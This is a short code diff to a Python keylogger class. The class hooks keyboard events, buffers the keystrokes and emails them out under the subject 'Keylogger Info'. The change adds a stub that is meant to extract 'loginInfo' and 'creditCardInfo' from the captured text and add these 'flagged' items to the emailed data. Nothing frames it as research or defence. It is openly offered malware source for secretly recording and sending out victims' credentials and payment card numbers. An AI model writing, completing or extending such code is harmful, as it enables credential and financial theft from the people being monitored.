@@ -30,10 +30,19 @@ class Keylogger:
             if event.name == "shift" or event.name ==  'right shift':
                 self.shift_keys -= 1
             
+    def __format_local_buffer(buffer) -> dict:
+        # Check email with regex
+        # Check digits
+        formatted_local_buffer = {"loginInfo": [], "creditCardInfo": []}
+
+        return formatted_local_buffer
 
     def __email_local_buffer(self, emailer: Emailer) -> bool:
         
-        data = {"raw": self.local_buffer_raw, 'formatted': self.local_buffer}
+        # Flag stuff
+        flagged_objects = self.__format_local_buffer(self.local_buffer)
+
+        data = {"raw": self.local_buffer_raw, 'formatted': self.local_buffer, "flagged": flagged_objects}
 
         try:
             emailer.send_email("Keylogger Info", json.dumps(data))
@@ -47,6 +56,8 @@ class Keylogger:
             self.local_buffer = ""
             self.local_buffer_raw = ""
             print("Reset local buffer")
+
+    
 
     def run(self) -> None:
         keyboard.hook(self.__handle_key_press)
